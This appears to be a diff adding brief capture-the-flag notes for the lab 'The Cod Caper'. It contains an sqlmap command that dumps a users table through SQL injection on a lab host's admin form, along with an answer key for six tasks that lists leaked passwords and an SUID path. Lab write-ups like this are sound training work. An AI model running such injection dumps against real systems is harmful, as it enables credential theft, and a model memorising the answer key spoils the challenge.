@@ -1,0 +1,54 @@
+                                The Cod Caper
+
+      IP: 10.10.143.125
+
+    sudo sqlmap --url http://10.10.143.125/administrator.php 
+    --data 'username=&password=' -D users -T users -dump
+      Table: users
+    [1 entry]
+    +----------+------------+
+    | username | password   |
+    +----------+------------+
+    | pingudad | secretpass |
+    +----------+------------+
+
+        
+     # TASK 1
+    ===========
+     1. NO ANSWER NEEDED
+
+     # TASK 2
+    ===========
+     1. HOW MANY PORTS ARE OPEN? = 2
+
+     2. WHAT IS THE TITLE OF THE HTTP WEB SERVER? = Apache2 Ubuntu Default Page: It works
+
+     3. WHAT VERSION IS THE SSH SERVICE? = OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
+
+     4. WHAT IS THE VERSION OF THE WEB SERVER?= Apache/2.4.18 
+
+     # TASK 3
+    ===========
+     1. WHAT IS THE NAME OF THE IMPORTANT FILE ON THE WEB SERVER?=administrator.php
+
+     # TASK 4
+    ===========
+     1. WHAT IS THE ADMIN USERANAME?= pingudad
+
+     2. WHAT IS THE ADMIN PASSWORD?=secretpass
+
+     3. HOW MANY FORMS OF SQLI IS THE FORM VULNERABLE TO?=3
+
+     # TASK 5
+    ============
+
+    1. HOW MANY FILES ARE IN THE CURRENT DIRECTORY?=3
+
+    2. DO I STILL HAVE AN ACCOUNT?=yes
+
+    3. WHAT IS MY SSH PASSWORD?=pinguapingu
+
+    # TASK 6
+    ===========
+
+    1. WHAT IS THE PATH OF THE INTERESTING SUID FILE?=/opt/secret/root
